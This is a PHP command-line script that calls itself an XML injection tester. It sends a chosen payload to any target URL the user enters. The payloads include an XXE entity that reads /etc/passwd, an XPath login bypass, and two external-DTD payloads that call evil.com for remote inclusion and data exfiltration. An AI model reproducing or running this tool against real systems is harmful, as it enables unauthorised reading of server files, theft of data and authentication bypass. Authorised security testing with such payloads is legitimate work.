<?php
// Function to send HTTP GET request with error handling and timeout
function sendGetRequest($url, $timeout = 10) {
    $options = array(
        'http' => array(
            'method' => 'GET',
            'ignore_errors' => true, // Handle non-200 status codes
            'timeout' => $timeout,   // Set timeout in seconds
        )
    );
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        error_log("Failed to connect to the target website or request timed out.");
        exit();
    }
    return $response;
}

// Function to parse HTTP response headers and extract status code
function getStatusCode($headers) {
    preg_match('/HTTP\/\d\.\d\s+(\d+)/', $headers[0], $matches);
    return isset($matches[1]) ? (int) $matches[1] : null;
}

// Color constants
define('COLOR_RESET', "\033[0m");
define('COLOR_RED', "\033[0;31m");
define('COLOR_GREEN', "\033[0;32m");
define('COLOR_YELLOW', "\033[0;33m");

echo "Welcome to XML Injection Vulnerability Tester\n";
echo "----------------------------------------------\n";
echo "Please enter the target website URL (e.g., http://example.com): ";
$target_url = trim(fgets(STDIN));

// Validate URL format and add 'https://' if missing
if (!preg_match("~^(?:f|ht)tps?://~i", $target_url)) {
    $target_url = 'https://' . $target_url;
}
if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
    echo "Invalid URL format. Please enter a valid URL.\n";
    exit();
}

// Predefined XML payloads for different types of XML injection attacks
$xml_payloads = array(
    "Entity Injection" => '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    "XPath Injection" => '<auth><username>\' or 1=1 or \'</username><password></password></auth>',
    "XML Structure Manipulation" => '<root><element1>data1</element1><element2>data2</element2></root>&lt;malicious&gt;payload&lt;/malicious&gt;',
    "XXE Remote File Inclusion" => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
    "DTD Exfiltration" => '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root>&exfil;</root>'
);

echo "Choose a predefined XML payload:\n";
$payload_options = array_keys($xml_payloads);
foreach ($payload_options as $key => $value) {
    echo "[" . ($key + 1) . "] " . $value . "\n";
}
echo "Enter your choice (1-" . count($payload_options) . "): ";
$choice = trim(fgets(STDIN));

if (!isset($payload_options[$choice - 1])) {
    echo COLOR_RED . "Invalid choice. Please enter a valid option.\n" . COLOR_RESET;
    exit();
}

$xml_payload = $xml_payloads[$payload_options[$choice - 1]];

echo "Enter the timeout value in seconds (default is 10 seconds, press Enter for default): ";
$timeout_input = trim(fgets(STDIN));
$timeout = ($timeout_input !== "") ? (int) $timeout_input : 10;

// Send a GET request with the XML payload
$response = sendGetRequest($target_url . "?xml=" . urlencode($xml_payload), $timeout);

// Get response status code
$status_code = getStatusCode($http_response_header);

// Check for errors in the response
if ($status_code !== 200) {
    echo COLOR_RED . "Error: HTTP status code " . $status_code . "\n" . COLOR_RESET;
    echo "Response from the target website:\n";
    echo $response;
} else {
    echo COLOR_GREEN . "Response from the target website:\n" . COLOR_RESET;
    echo $response;
}
?>
